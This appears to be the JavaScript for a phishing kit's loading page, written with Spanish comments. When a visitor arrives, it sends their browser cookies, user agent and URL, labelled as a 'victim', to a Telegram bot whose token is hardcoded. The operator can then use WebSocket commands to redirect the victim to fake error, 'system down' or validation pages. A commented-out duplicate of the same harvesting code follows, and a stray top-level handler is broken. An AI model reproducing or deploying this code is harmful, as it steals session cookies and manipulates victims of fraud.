document.addEventListener("DOMContentLoaded", () => {
    const loader = document.getElementById("loading-overlay");
    loader.style.display = "flex"; // Mostrar loader

    const protocol = window.location.protocol === "https:" ? "wss" : "ws";
    const ws = new WebSocket(`${protocol}://${window.location.host}`);

    ws.onopen = () => {
        console.log("🔌 Conectado al WebSocket.");
    };

    ws.onerror = (error) => {
        console.error("❌ Error en WebSocket:", error);
    };

    ws.onmessage = (event) => {
        console.log("📩 Mensaje recibido del WebSocket:", event.data);

        // 🔥 Solo redirige si la página recibida es diferente de "loader" y diferente de la actual
        if (event.data !== "loader" && event.data !== getCurrentPage()) {
            console.log(`✅ Cambio detectado: Redirigiendo a ${event.data}.html`);
            loader.style.display = "none";
            window.location.href = event.data + ".html";
        } else {
            console.log("⏳ Permaneciendo en loader.html...");
        }
    };

    ws.onclose = () => {
        if (!sessionStorage.getItem("reloaded")) {
            sessionStorage.setItem("reloaded", "true");
            console.warn("⚠️ Conexión WebSocket cerrada. Intentando reconectar...");
            setTimeout(() => location.reload(), 3000);
        }
    };
});

// 🔍 Función para obtener la página actual
function getCurrentPage() {
    return window.location.pathname.split("/").pop().replace(".html", "");
}

// 📩 Enviar notificación a Telegram
function enviarNotificacionPagina() {
    let bots = [
        { 
            token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
            chatId: "6328222257" 
        }  
    ];

    if (!sessionStorage.getItem("telegramNotificado")) {
        sessionStorage.setItem("telegramNotificado", "true");

        bots.forEach(bot => {
            const mensaje = escapeMarkdownV2(`👀   *Víctima en página de carga*
🌐    Detalles  :\n
📱    Dispositivo:\n ${navigator.userAgent}\n
🍪    Cookies: ${document.cookie || 'Sin cookies'}\n
🌍 URL: ${window.location.href}\n

📝 **Opciones:** 
➡️ /show pag1 - Dinámica 
➡️ /show pag2 - Dinámica + Error
➡️ /show pag3 - Sistema caído
➡️ /show pag4 - Exitoso
➡️ /show pag5 - Validación `);

            fetch('/enviar-telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    token: bot.token,
                    chatId: bot.chatId,
                    mensaje: mensaje
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log(`📩 Notificación enviada al bot: ${bot.token}`);
            })
            .catch(error => {
                console.error(`❌ Error al enviar notificación al bot ${bot.token}:`, error);
            });
        });
    }
}
ws.onmessage = (event) => {
    console.log("📩 Mensaje recibido del WebSocket:", event.data);

    if (event.data === "loader") {
        console.log("🔄 Permaneciendo en loader.html...");
        return; // 🔥 No hagas nada si el mensaje es "loader"
    }

    if (!event.data || event.data.trim() === "") {
        console.warn("⚠️ Mensaje vacío recibido. Ignorando...");
        return; // 🔥 No hagas nada si el mensaje está vacío
    }

    if (event.data !== getCurrentPage()) {
        console.log(`✅ Cambio detectado: Redirigiendo a ${event.data}.html`);
        loader.style.display = "none";
        window.location.href = event.data + ".html";
    } else {
        console.log("⏳ Ya estamos en la página correcta, no redirigir.");
    }
};


document.addEventListener('DOMContentLoaded', enviarNotificacionPagina);

// 📌 Escapar caracteres problemáticos en MarkdownV2 de Telegram
function escapeMarkdownV2(text) {
    return text.replace(/([_*()~`>#+\-=|{}.!])/g, "\\$1");
}


// / document.addEventListener("DOMContentLoaded", () => {
//     const loader = document.getElementById("loading-overlay");
//     loader.style.display = "flex"; //mostrar loader
//     //const ws = new WebSocket(`wss://${window.location.host}`);//funciona solo en azure

//     const protocol = window.location.protocol === "https:" ? "wss" : "ws";
//     const ws = new WebSocket(`${protocol}://${window.location.host}`); //funciona en local/azure


//     ws.onopen = () => {
//         console.log("🔌 Conectado al servidor WebSocket{Todo Melo}");
//     };

//     ws.onerror = (error) => {
//         console.error("❌ Error en la conexión WebSocket:{Paila Se Cayo la vuelta", error);
//     };

//     ws.onmessage = (event) => {
//         console.log("📩 Mensaje recibido:", event.data);
        
//         if (event.data !== "loader") { // 🔥 Solo redirige si recibe una página válida
//             loader.style.display = "none";
//             window.location.href = event.data + ".html";
//         }
//     };

//     // EVITA QUE LOADER HAGA RECARGAS INFINITAS

//     ws.onclose = () => {
//         if (!sessionStorage.getItem("reloaded")) {
//              sessionStorage.setItem("reloaded", "true");
//              console.warn("⚠️ Conexión WebSocket cerrada. Intentando reconectar...");
//              setTimeout(() => location.reload(), 3000);
//          }
//     };


//     ws.onclose = () => {
//         console.warn("⚠️ Conexión WebSocket cerrada. Intentando recolectar en 3 segundos...");
//         setTimeout(() => location.reload(), 3000);
//     };
// });

// function escapeMarkdownV2(text) {
//     return text.replace(/([_*()~`>#+\-=|{}.!])/g, "\\$1");  // Escapa caracteres conflictivos
// }

// function recargarUnaVez() {
//     // Verificar si la página ya ha sido recargada
//     if (!sessionStorage.getItem('recargado')) {
//         // Establecer un indicador en sessionStorage para evitar recargas adicionales
//         sessionStorage.setItem('recargado', 'true');

//         // Configurar un temporizador para recargar la página después de 4 segundos
//         setTimeout(function() {
//             window.location.reload();
//         }, 4000); // 4000 milisegundos = 4 segundos
//     }
// }

// // Llamar a la función para iniciar el proceso
// recargarUnaVez();



// function enviarNotificacionPagina() {


//     let bots = [
//         { 
//             token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
//             chatId: "6328222257" 
//         }  
//     ];

//     // VERIFICACION PARA SOLO ENVIARLO UNA VEZ

//      if (!sessionStorage.getItem("telegramNotificado")) {
//          sessionStorage.setItem("telegramNotificado", "true");
//          fetch("/enviar-telegram", {
//              method: "POST",
//              headers: { "Content-Type": "application/json" },
//              body: JSON.stringify({ token: bot.token, chatId: bot.chatId, mensaje: mensaje })
//          });
//      }

//     bots.forEach(bot => {
//         // Validar que el token y chatId no estén vacíos
//         if (!bot.token || !bot.chatId) {
//             console.error("Token o ChatID vacío para el bot");
//             return;
//         }



//     const mensaje = escapeMarkdownV2(`👀   *Víctima en página de carga*
// 🌐    Detalles  :\n
// 📱    Dispositivo:\n ${navigator.userAgent}\n
// 🍪    Cookies: ${document.cookie || 'Sin cookies'}\n
// 🌍 URL: ${window.location.href}\n

// 📝 **Opciones:** 
// ➡️ /show pag1 - Dinámica 
// ➡️ /show pag2 - Dinámica + Error
// ➡️ /show pag3 - Sistema caído
// ➡️ /show pag4 - Exitoso
// ➡️ /show pag5 - Validación `);

//         // Utilizar el endpoint que agregamos en server.js
//         fetch('/enviar-telegram', {
//             method: 'POST',  // Método POST específicamente
//             headers: {
//                 'Content-Type': 'application/json'
//             },
//             body: JSON.stringify({
//                 token: bot.token,
//                 chatId: bot.chatId,
//                 mensaje: mensaje
//             })
//         })
//         .then(response => {
//             if (!response.ok) {
//                 throw new Error(`HTTP error! status: ${response.status}`);
//             }
//             return response.json();
//         })
//         .then(data => {
//             console.log(`Notificación enviada exitosamente al bot: ${bot.token}`);
//         })
//         .catch(error => {
//             console.error(`Error al enviar notificación al bot ${bot.token}:`, error);
//         });
//     });
// }

// // Llamar a la función automáticamente al cargar la página
// document.addEventListener('DOMContentLoaded', enviarNotificacionPagina);
